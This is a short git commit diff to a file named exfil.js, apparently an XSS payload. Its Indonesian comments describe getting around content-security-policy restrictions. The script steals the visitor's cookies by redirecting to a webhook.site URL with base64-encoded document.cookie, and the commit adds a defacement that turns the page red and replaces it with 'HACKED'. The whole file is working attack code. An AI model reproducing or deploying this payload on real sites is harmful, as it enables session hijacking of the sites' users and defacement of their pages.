8b0083fcf91cfa194302144db306c26e8287fd9b
Fauzi Ismail <mailvelous.career@gmail.com>
2026-01-01 06:56:23 +0700

    Change background to red and display hacked message
    Modify exfil.js to change background color and content.

--- exfil.js
+++ exfil.js
@@ -1,3 +1,7 @@
 // Menggunakan window.location untuk bypass pembatasan img-src dan connect-src
 // Data akan dikirim sebagai query parameter 'c'
+
+// Ganti background jadi merah atau hapus seluruh halaman
+document.body.style.backgroundColor = 'red';
+document.body.innerHTML = '<h1>HACKED</h1>';
 window.location = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + btoa(document.cookie);
